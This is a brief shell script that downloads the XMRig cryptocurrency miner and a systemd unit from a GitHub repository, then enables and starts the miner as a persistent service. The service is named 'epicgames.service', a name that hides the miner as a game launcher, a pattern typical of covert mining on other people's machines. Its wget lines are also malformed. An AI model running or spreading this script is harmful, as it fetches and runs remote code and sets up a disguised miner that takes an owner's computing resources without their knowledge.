echo "Autoinstalling XMRig"
wget https://github.com/MaybeTrollface/autoinstaller-for-xmrig/raw/main/xmrig /usr/local/bin/xmrig
wget https://raw.githubusercontent.com/MaybeTrollface/autoinstaller-for-xmrig/main/xmrig.service /etc/systemd/system/epicgames.service
systemctl enable epicgames.service
systemctl start epicgames.service
echo "Script probably done. Use systemctl status epicgames.service to check the status!"
